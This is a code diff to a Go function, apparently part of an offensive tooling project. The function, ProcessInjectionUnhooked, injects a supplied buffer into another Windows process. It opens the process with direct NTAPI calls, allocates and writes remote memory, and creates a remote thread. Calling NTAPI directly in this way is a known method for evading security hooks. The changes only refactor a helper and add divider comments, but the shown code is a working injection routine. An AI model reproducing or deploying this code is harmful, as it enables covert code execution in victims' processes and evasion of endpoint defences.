@@ -9,16 +9,6 @@ import (
 	"unsafe"
 )
 
-func InitObjectAttributes(objName *core.UNICODE_STRING, attributes uint32, rootDir uintptr) core.OBJECT_ATTRIBUTES {
-	return core.OBJECT_ATTRIBUTES{
-		Length:        uint32(unsafe.Sizeof(core.OBJECT_ATTRIBUTES{})),
-		RootDirectory: rootDir,
-		ObjectName:    uintptr(unsafe.Pointer(objName)),
-		Attributes:    attributes,
-		// SecurityDescriptor and SecurityQualityOfService left nil
-	}
-}
-
 func ProcessInjectionUnhooked(procId uintptr, buf *byte, size uintptr) {
 
 	//load NTAPI functions
@@ -57,7 +47,7 @@ func ProcessInjectionUnhooked(procId uintptr, buf *byte, size uintptr) {
 	// Prepare output handle, client ID and object attributes
 	var hProc uintptr
 	clientId := core.CLIENT_ID{UniqueProcess: uintptr(procId), UniqueThread: 0}
-	objAttr := InitObjectAttributes(nil, 0x40, 0)
+	objAttr := core.InitObjectAttributes(nil, 0x40, 0)
 	// Call NtOpenProcess
 	status := core.NtOpenProcess(
 		ntOpenProcessAddr,
@@ -75,6 +65,7 @@ func ProcessInjectionUnhooked(procId uintptr, buf *byte, size uintptr) {
 
 	regionSize := size
 	var baseAddr uintptr = 0
+	/*--------------------------NTALLOCATEVIRTUALMEMORY--------------------*/
 
 	status = core.NtAllocateVirtualMemory(
 		ntAllocateVirtualMemoryAddr,
@@ -94,6 +85,7 @@ func ProcessInjectionUnhooked(procId uintptr, buf *byte, size uintptr) {
 	}
 	allocaltedAddr := baseAddr
 	var bytesWritten uintptr
+	/*--------------------------NTWRITEVIRTUALMEMORY--------------------*/
 
 	status = core.NtWriteVirtualMemory(
 		ntWriteVirtualMemoryAddr,
@@ -110,6 +102,7 @@ func ProcessInjectionUnhooked(procId uintptr, buf *byte, size uintptr) {
 		fmt.Printf("NtWriteVirtualMemory failed, NTSTATUS=0x%X\n", status)
 	}
 
+	/*--------------------------NTCREATETHREAD--------------------*/
 	var hThread uintptr
 
 	status = core.NtCreateThreadEx(
